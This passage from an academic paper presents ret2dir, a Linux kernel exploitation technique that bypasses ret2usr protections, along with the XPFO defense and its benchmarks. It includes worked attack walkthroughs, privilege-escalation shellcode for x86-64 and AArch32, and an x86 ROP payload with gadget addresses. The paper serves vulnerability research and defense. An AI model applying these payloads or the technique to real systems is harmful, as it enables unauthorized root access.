con-\nsider. If a signature is not available, then all page frames\nare potential targets. By combining physmap spraying\nand signatures, we can maximize the probability that our\ninformed selection of an arbitrary page from physmap\nwill point to the exploit payload. The results of our ex-\nperimental security evaluation (Section 7) show that, de-\npending on the configuration, the probability of success\ncan be as high as 96%.\n6 Putting It All Together\n6.1 Bypassing SMAP and UDEREF\nWe begin with an example of a ret2dir attack against\nan x86 system hardened with SMAP or UDEREF. We\nassume an exploit for a kernel vulnerability that allows\nus to corrupt a kernel data pointer, named kdptr, and\noverwrite it with an arbitrary value [38,39,41]. On a sys-\ntem with an unhardened kernel, an attacker can overwrite\nkdptr with a user-space address, and force the kernel to\ndereference it by invoking the appropriate interface (e.g.,\na buggy system call). However, the presence of SMAP\nor UDEREF will cause a memory access violation, ef-\nfectively blocking the exploitation attempt. To overcome\nthis, a ret2dir attack can be mounted as follows.\nFirst, an attacker-controlled user process reserves a\nsingle page (4KB), say at address 0xBEEF000. Next,\nthe process moves on to initialize the newly allocated\nmemory with the exploit payload (e.g., a tampered-\nwith data structure). This payload initialization phase\nwill cause a page fault, triggering mm to request a free\npage frame from the buddy allocator and map it at ad-\ndress 0xBEEF000. Suppose that the buddy system\npicks page frame 1904 (0x770). In x86, under the de-\nfault 3G\/1G split, physmap starts at 0xC0000000,\nwhich means that the page frame has been pre-mapped\nat address 0xC0000000 + (4096 \u2217 0x770) =\n0xC0770000 (according to formula in Section 5.1).\nAt this point, 0xBEEF000 and 0xC0770000 are syn-\nonyms; they both map to the physical page that con-\ntains the attacker\u2019s payload. Consequently, any data\nin the area 0xBEEF000\u20130xBEEFFFFF is readily ac-\ncessible by the kernel through the synonym addresses\n0xC0770000\u20130xC0770FFF. To make matters worse,\ngiven that physmap is primarily used for implement-\ning dynamic memory, the kernel cannot distinguish\nwhether the kernel data structure located at address\n0xC0770000 is fake or legitimate (i.e., properly al-\nlocated using kmalloc). Therefore, by overwriting\nkdptr with 0xC0770000 (instead of 0xBEEF000),\nthe attacker can bypass SMAP and UDEREF, as both\nprotections consider benign any dereference of memory\naddresses above 0xC0000000.\n6.2 Bypassing SMEP, PXN, KERNEXEC,\nand kGuard\nWe use a running example from the x86-64 architec-\nture to demonstrate how a ret2dir attack can bypass\nKERNEXEC, kGuard, and SMEP (PXN operates almost\nidentically to SMEP). We assume the exploitation of\na kernel vulnerability that allows the corruption of\na kernel function pointer, namely kfptr, with an\narbitrary value [40, 42, 43, 45]. In this setting, the\nexploit payload is not a set of fake data structures, but\nmachine code (shellcode) to be executed with elevated\nprivilege. In real-world kernel exploits, the payload\ntypically consists of a multi-stage shellcode, the first\nstage of which stitches together kernel routines (second\nstage) for performing privilege escalation [89]. In most\ncases, this boils down to executing something similar to\ncommit_creds(prepare_kernel_cred(0)).\nThese two routines replace the credentials ((e)uid,\n(e)gid) of a user task with zero, effectively granting\nroot privileges to the attacking process.\nThe procedure is similar as in the previous exam-\nple. Suppose that the payload has been copied to\nuser-space address 0xBEEF000, which the buddy\nallocator assigned to page frame 190402 (0x2E7C2). In\nx86-64, physmap starts at 0xFFFF880000000000\n(see Table 1), and maps the whole RAM using reg-\nular pages (4KB). Hence, a synonym of address\n0xBEEF000 is located within kernel space at address\n0xFFFF880000000000 + (4096 \u2217 0x2E7C2)\n= 0xFFFF87FF9F080000.\nIn ret2usr scenarios where attackers control a kernel\nfunction pointer, an advantage is that they also control\nthe memory access rights of the user page(s) that con-\ntain the exploit payload, making it trivially easy to mark\nthe shellcode as executable. In a hardened system, how-\never, a ret2dir attack allows controling only the content\nof the respective synonym pages within physmap\u2014\nnot their permissions. In other words, although the at-\ntacker can set the permissions of the range 0xBEEF000\n\u2013 0xBEEFFFF, this will not affect the access rights of\nthe corresponding physmap pages.\nUnfortunately, as shown in Table 1, the W^X prop-\nerty is not enforced in many platforms, including\nx86-64. In our example, the content of user ad-\n\fdress 0xBEEF000 is also accessible through kernel\naddress 0xFFFF87FF9F080000 as plain, executable\ncode. Therefore, by simply overwriting kfptr with\n0xFFFF87FF9F080000 and triggering the kernel to\ndereference it, an attacker can directly execute shellcode\nwith kernel privileges. KERNEXEC, kGuard, and SMEP\n(PXN) cannot distinguish whether kfptr points to ma-\nlicious code or a legitimate kernel routine, and as long\nas kfptr \u2265 0xFFFF880000000000 and *kfptr is\nRWX, the dereference is considered benign.\nNon-executable physmap: In the above example,\nwe took advantage of the fact that some platforms map\npart (or all) of the physmap region as executable (X).\nThe question that arises is whether ret2dir can be ef-\nfective when physmap has sane permissions. As we\ndemonstrate in Section 7, even in this case, ret2dir at-\ntacks are possible through the use of return-oriented pro-\ngramming (ROP) [8,51,87].\nLet\u2019s revisit the previous example, this time under\nthe assumption that physmap is not executable. In-\nstead of mapping regular shellcode at 0xBEEF000, an\nattacker can map an equivalent ROP payload: an im-\nplementation of the same functionality consisting solely\nof a chain of code fragments ending with ret instruc-\ntions, known as gadgets, which are located in the ker-\nnel\u2019s (executable) text segment. To trigger the ROP\nchain, kfptr is overwritten with an address that points\nto a stack pivoting gadget, which is needed to set the\nstack pointer to the beginning of the ROP payload, so\nthat each gadget can transfer control to the next one. By\noverwriting kfptr with the address of a pivot sequence,\nlike xchg %rax, %rsp; ret (assuming that %rax\npoints to 0xFFFF87FF9F080000), the synonym of\nthe ROP payload now acts as a kernel-mode stack. Note\nthat Linux allocates a separate kernel stack for every user\nthread using kmalloc, making it impossible to differ-\nentiate between a legitimate stack and a ROP payload\n\u201cpushed\u201d in kernel space using ret2dir, as both reside in\nphysmap. Finally, the ROP code should also take care\nof restoring the stack pointer (and possibly other CPU\nregisters) to allow for reliable kernel continuation [3,81].\n7 Security Evaluation\n7.1 Effectiveness\nWe evaluated the effectiveness of ret2dir against ker-\nnels hardened with ret2usr protections, using real-world\nand custom exploits. We obtained a set of eight ret2usr\nexploits from the Exploit Database (EDB) [75], cover-\ning a wide range of kernel versions (v2.6.33.6\u2013v3.8).\nWe ran each exploit on an unhardened kernel to ver-\nify that it works, and that it indeed follows a ret2usr\nexploitation approach. Next, we repeated the same ex-\nperiment with every kernel hardened against ret2usr at-\ntacks, and, as expected, all exploits failed. Finally, we\ntransformed the exploits into ret2dir-equivalents, using\nthe technique(s) presented in Section 5, and used them\nagainst the same hardened systems. Overall, our ret2dir\nversions of the exploits bypassed all available ret2usr\nprotections, namely SMEP, SMAP, PXN, KERNEXEC,\nUDEREF, and kGuard.\nTable 2 summarizes our findings. The first two\ncolumns (EDB-ID and CVE) correspond to the tested ex-\nploit, and the third (Arch.) and fourth (Kernel) denote the\narchitecture and kernel version used. The Payload col-\numn indicates the type of payload pushed in kernel space\nusing ret2dir, which can be a ROP payload (ROP), exe-\ncutable instructions (SHELLCODE), tampered-with data\nstructures (STRUCT), or a combination of the above, de-\npending on the exploit. The Protection column lists the\ndeployed protection mechanisms in each case. Empty\ncells correspond to protections that are not applicable in\nthe given setup, because they may not be (i) available for\na particular architecture, (ii) supported by a given ker-\nnel version, or (iii) relevant against certain types of ex-\nploits. For instance, PXN is available only in ARM ar-\nchitectures, while SMEP and SMAP are Intel processor\nfeatures. Furthermore, support for SMEP was added in\nkernel v3.2 and for SMAP in v3.7. Note that depending\non the permissions of the physmap area (see Table 1),\nwe had to modify some of the exploits that relied on plain\nshellcode to use a ROP payload, in order to achieve ar-\nbitrary code execution (although in ret2usr exploits at-\ntackers can give executable permission to the user-space\nmemory that contains the payload, in ret2dir exploits it is\nnot possible to modify the permissions of physmap).5\nEntries for kGuard marked with * require access to the\n(randomized) text section of the respective kernel.\nAs we mentioned in Section 2.3, KERNEXEC and\nUDEREF were recently ported to the AArch32 architec-\nture [90]. In addition to providing stronger address space\nseparation, the authors made an effort to fix the permis-\nsions of the kernel in AArch32, by enforcing the W^X\nproperty for the majority of RWX pages in physmap.\nHowever, as the respective patch is currently under de-\nvelopment, there still exist regions inside physmap that\nare mapped as RWX. In kernel v3.8.7, we identified a\n~6MB physmap region mapped as RWX that enabled the\nexecution of plain shellcode in our ret2dir exploit.\nThe most recent kernel version for which we found a\npublicly-available exploit is v3.8. Thus, to evaluate the\nlatest kernel series (v3.12) we used a custom exploit. We\n5\nExploit 15285 uses ROP code to bypass KERNEXEC\/UDEREF\nand plain shellcode to evade kGuard. Exploit 26131 uses ROP\ncode in x86 (kernel v3.5) to bypass KERNEXEC\/UDEREF and\nSMEP\/SMAP, and plain shellcode in x86-64 (kernel v3.8) to bypass\nkGuard, KERNEXEC, and SMEP.\n\fEDB-ID CVE Arch. Kernel Payload Protection Bypassed\n26131 2013-2094 x86\/x86-64 3.5\/3.8 ROP\/SHELLCODE |KERNEXEC|UDEREF|kGuard |SMEP|SMAP| | \u2713\n24746 2013-1763 x86-64 3.5 SHELLCODE |KERNEXEC| |kGuard |SMEP| | | \u2713\n15944 N\/A x86 2.6.33.6 STRUCT+ROP |KERNEXEC|UDEREF|kGuard*| | | | \u2713\n15704 2010-4258 x86 2.6.35.8 STRUCT+ROP |KERNEXEC|UDEREF|kGuard*| | | | \u2713\n15285 2010-3904 x86-64 2.6.33.6 ROP\/SHELLCODE |KERNEXEC|UDEREF|kGuard | | | | \u2713\n15150 2010-3437 x86 2.6.35.8 STRUCT | |UDEREF| | | | | \u2713\n15023 2010-3301 x86-64 2.6.33.6 STRUCT+ROP |KERNEXEC|UDEREF|kGuard*| | | | \u2713\n14814 2010-2959 x86 2.6.33.6 STRUCT+ROP |KERNEXEC|UDEREF|kGuard*| | | | \u2713\nCustom N\/A x86 3.12 STRUCT+ROP |KERNEXEC|UDEREF|kGuard*|SMEP|SMAP| | \u2713\nCustom N\/A x86-64 3.12 STRUCT+ROP |KERNEXEC|UDEREF|kGuard*|SMEP|SMAP| | \u2713\nCustom N\/A AArch32 3.8.7 STRUCT+SHELLCODE |KERNEXEC|UDEREF|kGuard | | | | \u2713\nCustom N\/A AArch64 3.12 STRUCT+SHELLCODE | | |kGuard | | |PXN| \u2713\nTable 2: Tested exploits (converted to use the ret2dir technique) and configurations.\nx86-64 AArch32\npush %rbp | push r3, lr\nmov %rsp, %rbp | mov r0, #0\npush %rbx | ldr r1, [pc, #16]\nmov $<pkcred>, %rbx | blx r1\nmov $<ccreds>, %rax | pop r3, lr\nmov $0x0, %rdi | ldr r1, [pc, #8]\ncallq *%rax | bx r1\nmov %rax, %rdi | <pkcred>\ncallq *%rbx | <ccreds>\nmov $0x0, %rax |\npop %rbx |\nleaveq |\nret |\nFigure 3: The plain shellcode used in ret2dir ex-\nploits for x86-64 (left) and AArch32 (right) targets\n(pkcred and ccreds correspond to the addresses of\nprepare_kernel_cred and commit_creds).\nartificially injected two vulnerabilities that allowed us to\ncorrupt a kernel data or function pointer, and overwrite it\nwith a user-controlled value (marked as \u201cCustom\u201d in Ta-\nble 2). Note that both flaws are similar to those exploited\nby the publicly-available exploits. Regarding ARM, the\nmost recent PaX-protected AArch32 kernel that we suc-\ncessfully managed to boot was v3.8.7.\nWe tested every applicable protection for each exploit.\nIn all cases, the ret2dir versions transfered control solely\nto kernel addresses, bypassing all deployed protections.\nFigure 3 shows the shellcode we used in x86-64 and\nAArch32 architectures. The shellcode is position inde-\npendent, so the only change needed in each exploit is to\nto replace pkcred and ccreds with the addresses of\nprepare_kernel_cred and commit_creds, re-\nspectively, as discussed in Section 6.2. By copying the\nshellcode into a user-space page that has a synonym in\nthe physmap area, we can directly execute it from ker-\n\/* save orig. esp *\/\n0xc10ed359 \/* pop %edx ; ret *\/\n<SCRATCH_SPACE_ADDR1>\n0xc127547f \/* mov %eax, (%edx) ; ret *\/\n\/* save orig. ebp *\/\n0xc10309d5 \/* xchg %eax, %ebp ; ret *\/\n0xc10ed359 \/* pop %edx ; ret *\/\n<SCRATCH_SPACE_ADDR2>\n0xc127547f \/* mov %eax, (%edx) ; ret *\/\n\/* commit_creds(prepare_kernel_cred(0))*\/\n0xc1258894 \/* pop %eax ; ret *\/\n0x00000000\n0xc10735e0 \/* addr. of prepare_kernel_cred *\/\n0xc1073340 \/* addr. of commit_creds\u2019 *\/\n\/* restore the saved CPU state *\/\n0xc1258894 \/* pop %eax ; ret *\/\n<SCRATCH_SPACE_ADDR2>\n0xc1036551 \/* mov (%eax), %eax ; ret *\/\n0xc10309d5 \/* xchg %eax, %ebp ; ret *\/\n0xc1258894 \/* pop %eax ; ret *\/\n<SCRATCH_SPACE_ADDR1>\n0xc1036551 \/* mov (%eax), %eax ; ret *\/\n0xc100a7f9 \/* xchg %eax, %esp ; ret *\/\nFigure 4: Example of an x86 ROP payload (kernel v3.8)\nused in our ret2dir exploits for elevating privilege.\nnel mode by overwriting a kernel code pointer with the\nphysmap-resident synonym address of the user-space\npage. We followed this strategy for all cases in which\nphysmap was mapped as executable (corresponding to\nthe entries of Table 2 that contain SHELLCODE in the\nPayload column).\nFor cases in which physmap is non-executable,\nwe substituted the shellcode with a ROP payload that\nachieves the same purpose. In those cases, the cor-\nrupted kernel code pointer is overwritten with the ad-\ndress of a stack pivoting gadget, which brings the ker-\nnel\u2019s stack pointer to the physmap page that is a syn-\nonym for the user page that contains the ROP pay-\nload. Figure 4 shows an example of an x86 ROP pay-\nload used in our exploits. The first gadgets preserve\n\fPhysical Memory\n1GB 2GB 4GB 8GB 16GB\nSuccess\nProbability\n0\n0.2\n0.4\n0.6\n0.8\n1\nIdle\nBrowsing\nKernel Build\nFigure 5: Probability that a selected physmap address\nwill point to the exploit payload (successful exploitation)\nwith a single attempt, when using physmap spraying, as\na function of the available RAM.\nthe esp and ebp registers to facilitate reliable con-\ntinuation (as discussed in Section 6.2). The scratch\nspace can be conveniently located inside the controlled\npage(s), so the addresses SCRATCH_SPACE_ADDR1\nand SCRATCH_SPACE_ADDR2 can be easily computed\naccordingly. The payload then executes essentially the\nsame code as the shellcode to elevate privilege.\n7.2 Spraying Performance\nIn systems without access to pagemap, ret2dir attacks\nhave to rely on physmap spraying to find a synonym\nthat corresponds to the exploit payload. As discussed\nin Section 5.2, the probability of randomly selecting a\nphysmap address that indeed points to the exploit pay-\nload depends on (i) the amount of installed RAM, (ii)\nthe physical memory load due to competing processes,\nand (iii) the size of the physmap area. To assess this\nprobability, we performed a series of experiments under\ndifferent system configurations and workloads.\nFigure 5 shows the probability of successfully select-\ning a physmap address, with a single attempt, as a func-\ntion of the amount of RAM installed in our system; our\ntestbed included a single host armed with two 2.66GHz\nquad-core Intel Xeon X5500 CPUs and 16GB of RAM,\nrunning 64-bit Debian Linux v7. Each bar denotes the\naverage value over 5 repetitions and error bars corre-\nspond to 95% confidence intervals. On every repeti-\ntion we count the percentage of the maximum number\nof physmap-resident page frames that we managed to\naquire, using the spraying technique (Section 5.2), over\nthe size of physmap. We used three different work-\nloads of increasing memory pressure: an idle system, a\ndesktop-like workload with constant browsing activity in\nmultiple tabs (Facebook, Gmail, Twitter, YouTube, and\nthe USENIX website), and a distributed kernel compi-\nlation with 16 parallel threads running on 8 CPU cores\n(gcc, as, ld, make). Note that it is necessary to main-\ntain continuous activity in the competing processes so\nthat their working set remains hot (worst-case scenario),\notherwise the attacking ret2dir processes would easily\nsteal their memory-resident pages.\nThe probability of success increases with the amount\nof RAM. For the lowest-memory configuration (1GB),\nthe probability ranges between 65\u201368%, depending on\nthe workload. This small difference between the idle\nand the intensive workloads is an indication that de-\nspite the continuous activity of the competing processes,\nthe ret2dir processes manage to claim a large amount\nof memory, as a result of their repeated accesses to all\nalready allocated pages that in essence \u201clock\u201d them to\nmain memory. For the 2GB configuration the probability\njumps to 88%, and reaches 96% for 16GB.\nNote that as these experiments were performed on\na 64-bit system, physmap always mapped all avail-\nable memory. On 32-bit platforms, in which physmap\nmaps only a subset of RAM, the probability of success\nis even higher. As discussed in Section 5.1, in such\ncases, the additional memory pressure created by com-\npeting processes, which more likely were spawned be-\nfore the ret2dir processes, helps \u201cpushing\u201d ret2dir alloca-\ntions to the desired zones (ZONE_NORMAL, ZONE_DMA)\nthat fall within the physmap area. Finally, depending on\nthe vulnerability, it is quite common that an unsuccess-\nful attempt will not result in a kernel panic, allowing the\nattacker to run the exploit multiple times.\n8 Defending Against ret2dir Attacks\nRestricting access to \/proc\/<pid>\/pagemap, or\ndisabling the feature completely (e.g., by compiling the\nkernel without support for PROC_PAGE_MONITOR), is\na simple first step that can hinder, but not prevent, ret2dir\nattacks. In this section, we present an eXclusive Page\nFrame Ownership (XPFO) scheme for the Linux kernel\nthat provides effective protection with low overhead.\n8.1 XPFO Design\nXPFO is a thin management layer that enforces exclusive\nownership of page frames by either the kernel or user-\nlevel processes. Specifically, under XPFO, page frames\ncan never be assigned to both kernel and user space, un-\nless a kernel component explicitly requests that (e.g., to\nimplement zero-copy buffers [84]).\nWe opted for a design that does not penalize the\nperformance-critical kernel allocators, at the expense of\nlow additional overhead whenever page frames are al-\nlocated to (or reclaimed from) user processes. Recall\n\fthat physical memory is allotted to user space using the\ndemand paging and copy-on-write (COW) methods [7],\nboth of which rely on page faults to allocate RAM.\nHence, user processes already pay a runtime penalty for\nexecuting the page fault handler and performing the nec-\nessary bookkeeping. XPFO aligns well with this design\nphilosophy, and increases marginally the management\nand runtime overhead of user-space page frame alloca-\ntion. Crucially, the physmap area is left untouched, and\nthe slab allocator, as well as kernel components that in-\nterface directly with the buddy allocator, continue to get\npages that are guaranteed to be physically contiguous and\nbenefit from fast virtual-to-physical address translations,\nas there are no extra page table walks or modifications.\nWhenever a page frame is assigned to a user process,\nXPFO unmaps its respective synonym from physmap,\nthus breaking unintended aliasing and ensuring that mali-\ncious content can no longer be \u201cinjected\u201d to kernel space\nusing ret2dir. Likewise, when a user process releases\npage frames back to the kernel, XPFO maps the corre-\nsponding pages back in physmap to proactively facili-\ntate dynamic (kernel) memory requests. A key require-\nment here is to wipe out the content of page frames that\nare returned by (or reclaimed from) user processes, be-\nfore making them available to the kernel. Otherwise, a\nnon-sanitizing XPFO scheme would be vulnerable to the\nfollowing attack. A malicious program spawns a child\nprocess that uses the techniques presented in Section 5\nto map its payload. Since XPFO is in place, the payload\nis unmapped from physmap and cannot be addressed\nby the kernel. Yet, it will be mapped back once the child\nprocess terminates, making it readily available to the ma-\nlicious program for mounting a ret2dir attack.\n8.2 Implementation\nWe implemented XPFO in the Linux kernel v3.13. Our\nimplementation (\u223c500LOC) keeps the management and\nruntime overhead to the minimum, by employing a set of\noptimizations related to TLB handling and page frame\ncleaning, and handles appropriately all cases in which\npage frames are allocated to (and reclaimed from) user\nprocesses. Specifically, XPFO deals with: (a) demand\npaging frames due to previously-requested anonymous\nand shared memory mappings (brk, mmap\/mmap2,\nmremap, shmat), (b) COW frames (fork, clone),\n(c) explicitly and implicitly reclaimed frames (_exit,\nmunmap, shmdt), (d) swapping (both swapped out\nand swapped in pages), (e) NUMA frame migrations\n(migrate_pages, move_pages), and (f) huge pages\nand transparent huge pages.\nHandling the above cases is quite challenging. To\nthat end, we first extended the system\u2019s page frame data\nstructure (struct page) with the following fields:\nxpfo_kmcnt (reference counter), xpfo_lock (spin-\nlock) and xpfo_flags (32-bit flags field)\u2014struct\npage already contains a flags field, but in 32-bit systems\nit is quite congested [30]. Notice that although the kernel\nkeeps a struct page object for every page frame in\nthe system, our change requires only 3MB of additional\nspace per 1GB of RAM (\u223c0.3% overhead). Moreover,\nout of the 32 bits available in xpfo_flags, we only\nmake use of three: \u201cTainted\u201d (T; bit 0), \u201cZapped\u201d (Z; bit\n1), and \u201cTLB-shootdown needed\u201d (S; bit 2).\nNext, we extended the buddy system. Whenever\nthe buddy allocator receives requests for page frames\ndestined to user space (requests with GFP_USER,\nGFP_HIGHUSER, or GFP_HIGHUSER_MOVABLE set\nto gfp_flags), XPFO unmaps their respective syn-\nonyms from physmap and asserts xpfo_flags.T,\nindicating that the frames will be allotted to userland\nand their contents are not trusted anymore. In contrast,\nfor page frames destined to kernel space, XPFO asserts\nxpfo_flags.S (optimization; see below).\nWhenever page frames are released to the buddy sys-\ntem, XPFO checks if bit xpfo_flags.T was pre-\nviously asserted. If so, the frame was mapped to\nuser space and needs to be wiped out. After zeroing\nits contents, XPFO maps it back to physmap, resets\nxpfo_flags.T, and asserts xpfo_flags.Z (opti-\nmization; more on that below). If xpfo_flags.T\nwas not asserted, the buddy system reclaimed a frame\npreviously allocated to the kernel itself and no action\nis necessary (fast-path; no interference with kernel al-\nlocations). Note that in 32-bit systems, the above are\nnot performed if the page frame in question comes from\nZONE_HIGHMEM\u2014this zone contains page frames that\nare not direct-mapped.\nFinally, to achieve complete support of cases\n(a)\u2013(f), we leverage kmap\/kmap_atomic and\nkunmap\/kunmap_atomic. These functions are\nused to temporarily (un)map page frames acquired\nfrom ZONE_HIGHMEM (see Section 5.1). In 64-bit\nsystems, where the whole RAM is direct-mapped,\nkmap\/kmap_atomic returns the address of the re-\nspective page frame directly from physmap, whereas\nkunmap\/kunmap_atomic is defined as NOP and\noptimized by the compiler. If XPFO is enabled, all of\nthem are re-defined accordingly.\nAs user pages are (preferably) allocated from\nZONE_HIGHMEM, the kernel wraps all code related to\nthe cases we consider (e.g., demand paging, COW,\nswapping) with the above functions. Kernel com-\nponents that use kmap to operate on page frames\nnot related to user processes do exist, and we distin-\nguish these cases using xpfo_flags.T. If a page\nframe is passed to kmap\/kmap_atomic and that bit\nis asserted, this means that the kernel tries to oper-\n\fate on a frame assigned to user space via its kernel-\nresident synonym (e.g., to read its contents for swap-\nping it out), and thus is temporarily mapped back in\nphysmap. Likewise, in kunmap\/kunmap_atomic,\npage frames with xpfo_flags.T asserted are un-\nmapped. Note that in 32-bit systems, the XPFO\nlogic is executed on kmap routines only for direct-\nmapped page frames (see Table 1). xpfo_lock\nand xpfo_kmcnt are used for handling recursive or\nconcurrent invocations of kmap\/kmap_atomic and\nkunmap\/kunmap_atomic with the same page frame.\nOptimizations: The overhead of XPFO stems mainly\nfrom two factors: (i) sanitizing the content of reclaimed\npages, and (ii) TLB shootdown and flushing (necessary\nsince we modify the kernel page table). We employ three\noptimizations to keep that overhead to the minimum. As\nfull TLB flushes result in prohibitive slowdowns [53],\nin architectures that support single TLB entry invalida-\ntion, XPFO selectively evicts only those entries that cor-\nrespond to synonyms in physmap that are unmapped;\nin x86\/x86-64 this is done with the INVLPG instruction.\nIn systems with multi-core CPUs, XPFO must take\ninto consideration TLB coherency issues. Specifically,\nwe have to perform a TLB shootdown whenever a page\nframe previously assigned to the kernel itself is mapped\nto user space. XPFO extends the buddy system to use\nxpfo_flags.S for this purpose. If that flag is asserted\nwhen a page frame is alloted to user space, XPFO invali-\ndates the TLB entries that correspond to the synonym of\nthat frame in physmap, in every CPU core, by sending\nIPI interrupts to cascade TLB updates. In all other cases\n(i.e., page frames passed from one process to another, re-\nclaimed page frames from user processes that are later\non alloted to the kernel, and page frames allocated to the\nkernel, reclaimed, and subsequently allocated to the ker-\nnel again), XPFO performs only local TLB invalidations.\nTo alleviate the impact of page sanitization, we ex-\nploit the fact that page frames previously mapped to user\nspace, and in turn reclaimed by the buddy system, have\nxpfo_flags.Z asserted. We extended clear_page\nto check xpfo_flags.Z and avoid clearing the frame\nif the bit is asserted. This optimization avoids zeroing a\npage frame twice, in case it was first reclaimed by a user\nprocess and then subsequently allocated to a kernel path\nthat required a clean page\u2014clear_page is invoked by\nevery kernel path that requires a zero-filled page frame.\nLimitations: XPFO provides protection against\nret2dir attacks, by braking the unintended address space\nsharing between different security contexts. However, it\ndoes not prevent generic forms of data sharing between\nkernel and user space, such as user-controlled content\npushed to kernel space via I\/O buffers, the page cache, or\nthrough system objects like pipes and message queues.\nBenchmark Metric Original XPFO (%Overhead)\nApache Req\/s 17636.30 17456.47 (%1.02)\nNGINX Req\/s 16626.05 16186.91 (%2.64)\nPostgreSQL Trans\/s 135.01 134.62 (%0.29)\nKbuild sec 67.98 69.66 (%2.47)\nKextract sec 12.94 13.10 (%1.24)\nGnuPG sec 13.61 13.72 (%0.80)\nOpenSSL Sign\/s 504.50 503.57 (%0.18)\nPyBench ms 3017.00 3025.00 (%0.26)\nPHPBench Score 71111.00 70979.00 (%0.18)\nIOzone MB\/s 70.12 69.43 (%0.98)\ntiobench MB\/s 0.82 0.81 (%1.22)\ndbench MB\/s 20.00 19.76 (%1.20)\nPostMark Trans\/s 411.00 399.00 (%2.91)\nTable 3: XPFO performance evaluation results using\nmacro-benchmarks (upper part) and micro-benchmarks\n(lower part) from the Phoronix Test Suite.\n8.3 Evaluation\nTo evaluate the effectiveness of the proposed protection\nscheme, we used the ret2dir versions of the real-world\nexploits presented in Section 7.1. We back-ported our\nXPFO patch to each of the six kernel versions used in our\nprevious evaluation (see Table 2), and tested again our\nret2dir exploits when XPFO was enabled. In all cases,\nXPFO prevented the exploitation attempt.\nTo assess the performance overhead of XPFO, we\nused kernel v3.13, and a collection of macro-benchmarks\nand micro-benchmarks from the Phoronix Test Suite\n(PTS) [82]. PTS puts together standard system tests, like\napachebench, pgbench, kernel build, and IOzone,\ntypically used by kernel developers to track performance\nregressions. Our testbed was the same with the one used\nin Section 7.2; Table 3 summarizes our findings. Overall,\nXPFO introduces a minimal (negligible in most cases)\noverhead, ranging between 0.18\u20132.91%.\n9 Conclusion\nWe have presented ret2dir, a novel kernel exploitation\ntechnique that takes advantage of direct-mapped physical\nmemory regions to bypass existing protections against\nret2usr attacks. To improve kernel isolation, we designed\nand implemented XPFO, an exclusive page frame own-\nership scheme for the Linux kernel that prevents the im-\nplicit sharing of physical memory. The results of our ex-\nperimental evaluation demonstrate that XPFO offers ef-\nfective protection with negligible runtime overhead.\nAvailability\nOur prototype implementation of XPFO and all modified\nret2dir exploits are available at: http:\/\/www.cs.\ncolumbia.edu\/~vpk\/research\/ret2dir\/\n\fAcknowledgments\nThis work was supported by DARPA and the US Air\nForce through Contracts DARPA-FA8750-10-2-0253\nand AFRL-FA8650-10-C-7024, respectively, with addi-\ntional support from Intel Corp. Any opinions, findings,\nconclusions, or recommendations expressed herein are\nthose of the authors, and do not necessarily reflect those\nof the US Government, DARPA, the Air Force, or Intel.\nReferences\n[1] pagemap, from the userspace perspective, December 2008.\nhttps:\/\/www.kernel.org\/doc\/Documentation\/\nvm\/pagemap.txt.\n[2] ACCETTA, M. J., BARON, R. V., BOLOSKY, W. J., GOLUB,\nD. B., RASHID, R. F., TEVANIAN, A., AND YOUNG, M. Mach:\nA New Kernel Foundation for UNIX Development. In Proc. of\nUSENIX Summer (1986), pp. 93\u2013113.\n[3] ARGYROUDIS, P. Binding the Daemon: FreeBSD Kernel Stack\nand Heap Exploitation. In Black Hat USA (2010).\n[4] ARM R\nARCHITECTURE REFERENCE MANUAL. ARM R\nv7-A\nand ARM R\nv7-R edition. Tech. rep., Advanced RISC Machine\n(ARM), July 2012.\n[5] BEN HAYAK. The Kernel is calling a zero(day) pointer -\nCVE-2013-5065 - Ring Ring, December 2013. http:\/\/\nblog.spiderlabs.com\/2013\/12\/the-kernel-is-\ncalling-a-zeroday-pointer-cve-2013-5065-\nring-ring.html.\n[6] BONWICK, J. The Slab Allocator: An Object-Caching Kernel\nMemory Allocator. In Proc. of USENIX Summer (1994), pp. 87\u2013\n98.\n[7] BOVET, D. P., AND CESATI, M. Understanding the Linux Ker-\nnel, 3rd ed. 2005, ch. Memory Management, pp. 294\u2013350.\n[8] CHECKOWAY, S., DAVI, L., DMITRIENKO, A., SADEGHI, A.-\nR., SHACHAM, H., AND WINANDY, M. Return-Oriented Pro-\ngramming without Returns. In Proc. of CCS (2010), pp. 559\u2013572.\n[9] CHEN, H., MAO, Y., WANG, X., ZHOU, D., ZELDOVICH, N.,\nAND KAASHOEK, M. F. Linux kernel vulnerabilities: State-of-\nthe-art defenses and open problems. In Proc. of APsys (2011),\npp. 51\u201355.\n[10] COMMON VULNERABILITIES AND EXPOSURES. CVE-2005-\n0736, March 2005.\n[11] COMMON VULNERABILITIES AND EXPOSURES. CVE-2009-\n1527, May 2009.\n[12] COMMON VULNERABILITIES AND EXPOSURES. CVE-2009-\n2698, August 2009.\n[13] COMMON VULNERABILITIES AND EXPOSURES. CVE-2009-\n3002, August 2009.\n[14] COMMON VULNERABILITIES AND EXPOSURES. CVE-2009-\n3234, September 2009.\n[15] COMMON VULNERABILITIES AND EXPOSURES. CVE-2009-\n3547, October 2009.\n[16] COMMON VULNERABILITIES AND EXPOSURES. CVE-2010-\n2959, August 2010.\n[17] COMMON VULNERABILITIES AND EXPOSURES. CVE-2010-\n3437, September 2010.\n[18] COMMON VULNERABILITIES AND EXPOSURES. CVE-2010-\n3904, October 2010.\n[19] COMMON VULNERABILITIES AND EXPOSURES. CVE-2010-\n4073, October 2010.\n[20] COMMON VULNERABILITIES AND EXPOSURES. CVE-2010-\n4347, November 2010.\n[21] COMMON VULNERABILITIES AND EXPOSURES. CVE-2012-\n0946, February 2012.\n[22] COMMON VULNERABILITIES AND EXPOSURES. CVE-2013-\n0268, December 2013.\n[23] COMMON VULNERABILITIES AND EXPOSURES. CVE-2013-\n1828, February 2013.\n[24] COMMON VULNERABILITIES AND EXPOSURES. CVE-2013-\n2094, February 2013.\n[25] COMMON VULNERABILITIES AND EXPOSURES. CVE-2013-\n2852, April 2013.\n[26] COMMON VULNERABILITIES AND EXPOSURES. CVE-2013-\n2892, August 2013.\n[27] COMMON VULNERABILITIES AND EXPOSURES. CVE-2013-\n4343, June 2013.\n[28] CORBET, J. Virtual Memory I: the problem, March 2004.\nhttp:\/\/lwn.net\/Articles\/75174\/.\n[29] CORBET, J. An updated guide to debugfs, May 2009.\nhttp:\/\/lwn.net\/Articles\/334546\/.\n[30] CORBET, J. How many page flags do we really have?, June 2009.\nhttp:\/\/lwn.net\/Articles\/335768\/.\n[31] CORBET, J. Supervisor mode access prevention, October 2012.\nhttp:\/\/lwn.net\/Articles\/517475\/.\n[32] CORBET, J., KROAH-HARTMAN, G., AND MCPHERSON, A.\nLinux Kernel Development. 